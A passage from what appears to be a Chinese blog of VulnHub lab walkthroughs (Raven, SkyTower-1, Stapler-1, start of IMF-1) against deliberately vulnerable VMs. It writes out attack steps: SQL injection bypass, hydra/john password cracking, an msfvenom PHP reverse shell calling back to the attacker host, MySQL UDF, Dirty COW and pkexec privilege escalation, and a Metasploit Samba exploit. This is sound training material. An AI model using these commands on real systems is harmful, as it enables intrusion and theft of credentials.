bash"><table><tr><td class="code"><pre><span class="line">searchsploit PHPMailer</span><br><span class="line">locate php/webapps/40974.py</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py /home/kali/Desktop/working</span><br></pre></td></tr></table></figure><p>然后修改脚本, <code>contact.php</code>的反馈界面是发送邮件的, 根目录不行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930194944219.png" alt="image-20240930194944219"></p><p>执行脚本, 现在再根目录下有了一个<code>shell.php</code>, 监听设置的端口, 访问shell即可</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限: www-data</span><br><span class="line">内核版本和系统架构: 3.16.0-6-amd64</span><br><span class="line"># lsb_release -a</span><br><span class="line">发行版本: Debian GNU/Linux 8.11 (jessie)</span><br><span class="line">环境: python, gcc, cc</span><br><span class="line">用户: michael, steven</span><br><span class="line">服务: MySQL</span><br><span class="line">MySQL: root R@v3nSecurity</span><br></pre></td></tr></table></figure><p><code>flag2.txt</code>在<code>/var/www</code>, 为 flag2{fc3fd58dcdad9ab23faca6e9a36e581c}, MySQL账号密码来源自wordpress配置文件</p><p>我们之前得到的用户是可以通过ssh登录的, 可以尝试爆破, 可以得到<code>michael : michael</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.101.127 ssh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930201401748.png" alt="image-20240930201401748"></p><p>查一查用户的id, 没有明显信息, 通过<code>sudo -l</code>查执行权限, 没有可用</p><p>登录MySQL找信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mysql -uroot -pR@v3nSecurity</span><br><span class="line">show databases;</span><br><span class="line">use wordpress</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930202125076.png" alt="image-20240930202125076"></p><p>将这两个user_pass扒拉下来利用john进行爆破, 可以得到<code>steven : pink84</code>, 可以登陆ssh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>提权完也没找到flag, 发现在表里找到了flag3和flag4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from wp_posts;</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><h3 id="sudo提权"><a class="header-anchor" href="#sudo提权">¶</a>sudo提权</h3><p>查权限, 发现steven在<code>/usr/bin/python</code>有sudo权限, 那么利用py直接开一个新会话就能拿到root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930203027175.png" alt="image-20240930203027175"></p><h3 id="mysql-udf提权"><a class="header-anchor" href="#mysql-udf提权">¶</a>mysql udf提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version();</span><br><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">select @@plugin_dir;</span><br><span class="line"># show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># plugin 的值为空时不可提权, 此处为 /usr/lib/mysql/plugin/</span><br><span class="line">show variables like &#x27;version_compile_%&#x27;;</span><br><span class="line"># 远程登录被禁止</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930204544496.png" alt="image-20240930204544496"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit mysql udf</span><br><span class="line"># 就是那个1518.c, 省略复制到本地过程</span><br><span class="line">gcc -g -shared -Wl,-soname,1518.so -o mysqludf.so 1518.c -lc</span><br><span class="line"># 将mysqludf.so上传到靶机, 进行udf提权</span><br><span class="line">use wordpress;</span><br><span class="line">create table shell(line blob);</span><br><span class="line"># 创建表</span><br><span class="line">insert into shell values(load_file(&#x27;/tmp/mysqludf.so&#x27;));</span><br><span class="line"># 插入二进制的mysqludf.so</span><br><span class="line">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br><span class="line"># 导出mysqludf.so</span><br><span class="line">create function do_system returns integer soname &#x27;mysqludf.so&#x27;;</span><br><span class="line"># 创建do_system自定义函数</span><br><span class="line">select * from mysql.func;</span><br><span class="line"># 检查函数是否有do_system</span><br><span class="line"># 执行一下select do_system(&#x27;whoami&#x27;);, 发现是0, 那我的回显哪里去了</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 给find命令所有者的suid权限</span><br></pre></td></tr></table></figure><p>现在find应该有suid权限了, 试试find提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find `<span class="built_in">which</span> find` -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240930211655198.png" alt="image-20240930211655198"></p><p>其实可以稍微改一下mysql执行的命令就能有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table shell(line blob);</span><br><span class="line">insert into shell values(load_file(&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;));</span><br><span class="line"># 其实是可以直接放进去的</span><br><span class="line">create function do_system returns string soname &#x27;mysqludf.so&#x27;;</span><br><span class="line">select do_system(&#x27;whoami&#x27;);</span><br><span class="line"># 这个有回显, 就是换integer为string</span><br></pre></td></tr></table></figure><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>flag3本来在利用<code>steven : pink84</code>登录后访问<code>/wordpress/wp-admin/post.php?post=4&amp;action=edit</code>得到</p><p>flag4应该在获得root权限后在<code>/root</code>中得到, 但是内容都是一样的</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> UDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SkyTower-1</title>
      <link href="/article/SkyTower-1/"/>
      <url>/article/SkyTower-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>SkyTower-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/skytower-1,96/">vulnhub靶场-SkyTower:1</a></p><p>目标: attack a system using a multi-faceted approach and obtain the “flag”.</p><p>提示: You will most likely find that automated tools will not assist you.</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>Linux: 192.168.56.101</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><ul><li>端口: 22, 80, 3128, 其中22端口有防火墙</li><li>中间件: Apache 2.2.22, Squid http proxy 3.1.20</li><li>系统: Linux 3.2-3.16</li></ul><p>目录扫描没有任何的结果, 只能是从80下手了, 80也只有一个登录框</p><p>尝试sql注入, 发现输入<code>'</code>的时候返回mysql的错误信息, 尝试注入:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;|| 1=1 #</span><br></pre></td></tr></table></figure><p>任意一个为上即可, 发现账号密码<code>john : hereisjohn</code>, 且可以得到我们必须通过那个代理(3128)才能访问22端口</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929105418874.png" alt="image-20240929105418874"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>需要代理, 请出我们的proxychains工具:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.config</span><br><span class="line"><span class="comment"># 注释掉存在的代理, 添加下面的内容</span></span><br><span class="line">http  192.168.56.101 3128</span><br><span class="line"><span class="comment"># 尝试登录, 拿到shell</span></span><br><span class="line">proxychains ssh john@192.168.56.101 -t <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>proxychains ssh john@192.168.56.101</code>不成功的原因可能是登陆之后没有创建一个shell或者被干掉了, 直接退出了</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929110341140.png" alt="image-20240929110341140"></p><p>我这里将会话转移到msf上了, 比较稳定, 就不放图了; 也可以用perl反弹shell</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><ul><li>权限: john, 无sudo权限</li><li>环境: gcc/cc/python均无</li><li>系统: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux</li><li>用户: john, sara, william</li><li>MySQL: root root</li></ul><p>没法编译脚本, 脚本提权先放一边, 先看看还有什么漏了: 比如MySQL</p><blockquote><p>MySQL账密可以从<code>/var/www/login.php</code>得到</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use SkyTech</span><br><span class="line">show tables;</span><br><span class="line">select * from login</span><br></pre></td></tr></table></figure><p>明文存储密码; 正好对应三个用户, 试试ssh登录, sara可以登陆而william不行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929113650905.png" alt="image-20240929113650905"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/* 该目录下有root权限, 该目录在根目录下</span></span><br><span class="line">sudo <span class="built_in">ls</span> /accounts/../root</span><br><span class="line"><span class="comment"># 利用accounts的权限读取root, 有一个flag.txt</span></span><br><span class="line">sudo <span class="built_in">cat</span> /accounts/../root/flag.txt</span><br><span class="line"><span class="comment"># Congratz, have a cold one to celebrate! root password is theskytower</span></span><br><span class="line"><span class="comment"># 拿到root账密, 登录即可</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929114639882.png" alt="image-20240929114639882"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><h3 id="sql注入"><a class="header-anchor" href="#sql注入">¶</a>sql注入</h3><p>我是脚本小子, 我将告诉你用下面这个字典同时跑账号密码可以登录80端口</p><p><a href="https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list">https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list</a></p><h3 id="proxytunnel"><a class="header-anchor" href="#proxytunnel">¶</a>proxytunnel</h3><p>隧道代理, 可以映射到本地端口</p><p>使用条件: 防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566  </span><br><span class="line"><span class="comment"># kali本地5566端口</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566</span><br><span class="line"><span class="comment"># 登录失败</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566 <span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># 输入密码后会返回ls -a的结果</span></span><br></pre></td></tr></table></figure><p>抓一下<code>.bashrc</code>, 该文件用于操作shell, 发现该文件当 <code>$-</code> 包含 <code>i</code> 时不执行任何操作，而在不包含 <code>i</code> 时退出函数, 也就是无论如何这个shell都是无用的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) <span class="built_in">return</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>将其删除即可:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566 <span class="built_in">rm</span> .bashrc</span><br><span class="line"><span class="comment"># ssh john@127.0.0.1 -p 5566 rm .bashrc</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 工具利用 </tag>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 代理 </tag>
            
            <tag> shell禁用绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stapler-1</title>
      <link href="/article/Stapler-1/"/>
      <url>/article/Stapler-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Stapler-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/stapler-1,150/">vulnhub靶场-Stapler:1</a></p><p>目标: Get Root!</p><p>提示: 至少有2种途径获得shell, 至少有3种方法获得root权限</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>target:192.168.56.12</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.12</span><br><span class="line">nmap -A 192.168.56.12</span><br></pre></td></tr></table></figure><p>好多的端口呀</p><ul><li>端口: 21,22,53,80,139,666,3306,12380, 还有未开放20,123,137,128</li><li>服务: ftp3.0.3, dnsmasp 2.75, PHP server 5.5(80), MySQL 5.7.12, Apache 2.4.18(12380), smbd 4.3.9(139)</li><li>路径: 仅在80端口有<code>.bashrc</code>和<code>.profile</code>, 无可用信息</li><li>可能利用: ftp有匿名登录</li></ul><p>利用用户名为<code>Anonymous</code>, 密码为空登录ftp服务,找到一个note文件</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928144651989.png" alt="image-20240928144651989"></p><p>下载发现存在两个人名<code>Elly</code>和<code>John</code>, 可能是账号; 你的意思是? 有文件上传?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</span><br></pre></td></tr></table></figure><blockquote><p>看不懂666端口在干嘛, 据说可以用nc连接上去看看这个图片</p></blockquote><p>所以现在有可能能用的就是12380端口Apache, 以及139端口的smb; 下一步可能可以利用的就是22端口和3306端口</p><p>冻手!</p><p>12380处怎么访问都是跳转首页, 令人疑惑, 抓包发现跳转前返回400, 可能是协议错了, 更换为https发现正常, 可以重新扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin</span><br><span class="line">/robots.txt</span><br><span class="line"># 下面都是从robots.txt中来</span><br><span class="line">/admin112233</span><br><span class="line">/blogblog</span><br></pre></td></tr></table></figure><ol><li>先去/admin112233看看</li></ol><p>直接弹窗, 内容为<code>This could of been a BeEF-XSS hook ;)</code>, 抓包也没有任何东西, 可能为前端js弹窗</p><p>禁用js后返回另一条: <code>Give yourself a cookie! Javaseript didn't run =)</code></p><p>但是给自己设置了cookie后也没有任何的用处啊, 拉倒吧</p><ol start="2"><li>再去/blogblog</li></ol><p>居然是wordpress框架, 扫一下先, 发现可以查看已安装的插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/blogblog/readme.html    # version 4.2.1</span><br><span class="line">/blogblog/wp-admin</span><br><span class="line">/blogblog/wp-config.php    # 空</span><br><span class="line">/blogblog/wp-login.php</span><br><span class="line">/blogblog/wp-cron.php    # 空</span><br><span class="line">/blogblog/wp-includes    # 只能看文件名和架构</span><br><span class="line">/blogblog/wp-content</span><br></pre></td></tr></table></figure><p><code>/blogblog/wp-content/plugins</code>下是该网站安装的插件, 也许可以利用漏洞</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928165857732.png" alt="image-20240928165857732"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit advanced video</span><br><span class="line"><span class="comment"># 你别说还真有 WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py</span></span><br><span class="line"><span class="comment"># 省略复制下来的过程, 就是locate然后cp, 诶! 你先别急着运行</span></span><br><span class="line">python2 39646.py</span><br></pre></td></tr></table></figure><p>记得复制下来更改目标ip, 再加上关于SSL认证才能用</p><blockquote><p>我相信你通过这个网址能明白为什么要在py文件中加上两行代码</p><p><a href="https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error">https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error</a></p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928173606615.png" alt="image-20240928173606615"></p><p>现在返回<code>/blogblog/wp-content/uploads/</code>会新增jpeg文件, 这个就是配置文件了, 整下来</p><blockquote><p>运行目录下会新增个report文件夹, 可惜啥也没有</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 忽略ssl认证</span></span><br><span class="line">wget --no-check-certificate https://192.168.56.12:12380/blogblog/wp-content/uploads/650253163.jpeg</span><br><span class="line"><span class="comment"># 分析一下是什么文件, 改成对应文件类型</span></span><br><span class="line">file 650253163.jpeg</span><br><span class="line"><span class="built_in">mv</span> 650253163.jpeg config.php</span><br></pre></td></tr></table></figure><p>通过这个wordpress的配置文件获取到了MySQL的密码:<code>root : plbkac</code>, 登录查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pplbkac -h 192.168.56.12</span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br><span class="line">select user_login,user_pass from wp_users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928175835329.png" alt="image-20240928175835329"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>下面就是爆破密码了, 无论用什么方法, 你先把密码整下来变成一个文件(利用awk的方法放在附录)</p><blockquote><p>到达这里只剩wordpress后台和ssh没动过了, smb?(无感情)因为是直接拿到root我就写在附录里面了</p></blockquote><p>掏出<code>john</code>进行爆破, 爆出来账密<code>john : incorrect</code>, 可以登陆wordpress后台了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt pass1.txt</span><br><span class="line"><span class="comment"># 没有rockyou.txt就去/usr/share/wordlists/下解压对应文件</span></span><br></pre></td></tr></table></figure><p>后台找到了上传点<code>Plugins-&gt;Add New-&gt;Upload Plugin</code>, 你也可以直接用这个: <code>/blogblog/wp-admin/plugin-install.php?tab=upload</code></p><p>而且似乎没有过滤, msf立马杀过来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfvenom</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f raw -o shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># msfconsole</span></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.56.6</span><br><span class="line"><span class="built_in">set</span> lport 10000</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在<code>/blogblog/wp-content/uploads/</code>找到并点击那个php文件即可, 这就拿到shell了</p><p>关于ssh, 您猜怎么着, 我拿mysql爆出来的用户名以及已知的密码爆出来了: <code>zoe : plbkac</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.36 ssh -L users.txt -P pass.txt</span><br><span class="line"><span class="comment"># 这里的pass是user_email中扒出来的, 其实我两列都跑了</span></span><br><span class="line"><span class="comment"># 毕竟从nmap的扫描中可以得到计算机叫做red, 而邮箱又是@red.localhost, 跑跑试试呗</span></span><br></pre></td></tr></table></figure><p>这下两个shell方法都集齐了(可能直接用永恒之蓝不算getshell)</p><p>这里注意到每个用户下都有一个<code>.bash_history</code>, 结合我们在80端口下载的文件, 这是一个记录用户历史命令的文件; 可能会有有用的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/*/.bash_history</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928195135296.png" alt="image-20240928195135296"></p><p>很巧地得到了用户账密: <code>JKanode : thisimypassword</code>, <code>peter : JZQuyIN5</code></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>信息收集</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># Ubuntu 16.04 LTS</span></span><br><span class="line">gcc -v / g++ -v / cc -v</span><br><span class="line"><span class="comment"># gcc环境有的</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># 这个实在是太多了</span></span><br></pre></td></tr></table></figure><p>给一个批量查询id的linux脚本(记得给予权限), 问就是看看是不是有权限比较高的用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义需要查询的用户名列表</span></span><br><span class="line">usernames=(<span class="string">&quot;Aparnell&quot;</span> <span class="string">&quot;Drew&quot;</span> <span class="string">&quot;LSolum2&quot;</span> <span class="string">&quot;RNunemaker&quot;</span> <span class="string">&quot;Sam&quot;</span> <span class="string">&quot;jess&quot;</span> <span class="string">&quot;www&quot;</span> <span class="string">&quot;CCeaser&quot;</span> <span class="string">&quot;ETollefson&quot;</span> <span class="string">&quot;JKanode&quot;</span> <span class="string">&quot;MBassin&quot;</span> <span class="string">&quot;SHAY&quot;</span> <span class="string">&quot;Taylor&quot;</span> <span class="string">&quot;kai&quot;</span> <span class="string">&quot;zoe&quot;</span> <span class="string">&quot;CJoo&quot;</span> <span class="string">&quot;Eeth&quot;</span> <span class="string">&quot;JLipps&quot;</span> <span class="string">&quot;MFrei&quot;</span> <span class="string">&quot;SHayslett&quot;</span> <span class="string">&quot;elly&quot;</span> <span class="string">&quot;mel&quot;</span> <span class="string">&quot;DSwanger&quot;</span> <span class="string">&quot;IChadwick&quot;</span> <span class="string">&quot;LSolum&quot;</span> <span class="string">&quot;NATHAN&quot;</span> <span class="string">&quot;SStroud&quot;</span> <span class="string">&quot;jamie&quot;</span> <span class="string">&quot;peter&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历用户名列表</span></span><br><span class="line"><span class="keyword">for</span> username <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;usernames[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 使用id命令查询用户的userid并输出结果</span></span><br><span class="line">    userid=$(<span class="built_in">id</span> <span class="variable">$username</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;用户名：<span class="variable">$username</span> 的userid为：<span class="variable">$userid</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928194728160.png" alt="image-20240928194728160"></p><p>我们可以找到peter是可以用sudo提权的, 诶! 这密码不就有用了</p><h3 id="sudo提权"><a class="header-anchor" href="#sudo提权">¶</a>sudo提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh peter@192.168.56.12</span><br><span class="line"><span class="comment"># JZQuyIN5</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># (ALL : ALL) ALL 任何位置都能提权</span></span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928200104393.png" alt="image-20240928200104393"></p><h3 id="脏牛提权"><a class="header-anchor" href="#脏牛提权">¶</a>脏牛提权</h3><p>再怎么强大也是假的, dirty cow影响版本从2.6.22-4.8.3/4.7.9/4.4.26, 你这个4.4.0有些不够看了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 40847</span><br><span class="line"><span class="comment"># 靶机这边</span></span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s</span><br><span class="line"><span class="comment"># 这些都写在这个cpp文件开头了</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928201744890.png" alt="image-20240928201744890"></p><h3 id="CVE-2021-4034"><a class="header-anchor" href="#CVE-2021-4034">¶</a>CVE-2021-4034</h3><p>这个在我打了4个靶机之后, 我宣布它通杀 ubuntu16</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.6:12000/cve-2021-4034-poc.c</span><br><span class="line">gcc cve-2021-4034-poc.c -o poc</span><br><span class="line"><span class="built_in">chmod</span> 777 poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928202702042.png" alt="image-20240928202702042"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><h3 id="awk拆分"><a class="header-anchor" href="#awk拆分">¶</a>awk拆分</h3><p><a href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F<span class="string">&#x27;|&#x27;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> mysql.txt &gt; pass1.txt</span><br><span class="line">awk -F<span class="string">&#x27;|&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> mysql.txt &gt; user1.txt</span><br></pre></td></tr></table></figure><p>效果预览, 记得自己再处理一下</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928181816535.png" alt="image-20240928181816535"></p><h3 id="smb-永恒之蓝"><a class="header-anchor" href="#smb-永恒之蓝">¶</a>smb-永恒之蓝</h3><p>139端口就是这样的, 我们搜索到的如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</span><br></pre></td></tr></table></figure><p>搜一下, 然后拿几个比较新的, 是excellent的试一下</p><blockquote><p>其实再排一下Linux, 基本上就剩下一个了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search Samba</span><br><span class="line"><span class="comment"># exploit/linux/samba/is_known_pipename 那就是你了</span></span><br><span class="line">use exploit/linux/samba/is_known_pipename</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.56.12</span><br><span class="line"><span class="built_in">set</span> rport 139</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928204146507.png" alt="image-20240928204146507"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> FTP </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IMF-1</title>
      <link href="/article/IMF-1/"/>
      <url>/article/IMF-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>IMF-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/imf-1,162/">vulnhub靶场-IMF:1</a></p><p>目标: you must hack to get all flags and ultimately root</p><p>妙妙工具: python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.204.129</p><p>ubuntu: 192.168.204.134</p><p>kali2: 192.168.56.6</p><p>ubuntu2: 192.168.56.11</p><p>环境出问题了, 我得换一个</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap发现仅开启tcp 80</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.204.0/24</span><br><span class="line"></span><br><span 